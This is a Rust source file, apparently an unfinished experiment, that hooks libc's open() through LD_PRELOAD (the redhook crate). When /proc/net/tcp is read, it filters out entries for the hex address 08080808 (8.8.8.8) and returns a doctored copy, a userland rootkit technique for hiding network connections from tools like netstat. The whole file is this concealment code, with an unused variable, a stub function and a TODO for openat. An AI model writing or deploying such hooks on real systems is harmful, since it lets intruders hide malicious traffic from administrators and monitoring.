extern crate libc;
use libc::{c_char, c_int, fileno, fputs, fseek, tmpfile, SEEK_SET};
use std::{
    ffi::{CStr, CString}, fs::File, io::Read
};

redhook::hook! {
    unsafe fn open(cpath: *const c_char, oflag: c_int) -> c_int => hide_tcp {
        let path = CStr::from_ptr(cpath);
        if path != c"/proc/net/tcp" {
            // println!("[Skip] '{}'", path.to_string_lossy());
            return redhook::real!(open)(cpath, oflag);
        }
        let mut buf = String::new();
        let res = File::open("/proc/net/tcp")
            .and_then(|mut f| f.read_to_string(&mut buf));
        if res.is_err() {
            eprintln!("[Fail to read]");
            return redhook::real!(open)(cpath, oflag);
        };
    
        let mut out = String::new();
        let mut curline = -1;
        for l in buf.lines() {
            if curline == -1 {
                curline += 1;
                out.push_str(l);
                out.push_str("\r\n");
            }
            else if !l.contains("08080808:") {
                let curline_str = curline.to_string();
                let colon_pos = l.find(":").unwrap();
    
                out.push_str(&format!("{:>0w$}{}", curline_str, l.split_at(colon_pos).1, w = colon_pos));
                out.push_str("\r\n");
                
                curline += 1;
            }
        }
        let Ok(cstr) = CString::new(buf) else {
            eprintln!("[Fail to create cstr]");
            return redhook::real!(open)(cpath, oflag);
        };
    
        let file = tmpfile();
        fputs(CString::new(out).unwrap().as_ptr(), file);
        fseek(file, 0, SEEK_SET);
        fileno(file)
    }
}

unsafe fn open2(cpath: *const c_char, oflag: c_int) -> c_int {
    0
}


// TODO: openat() - https://linux.die.net/man/2/openat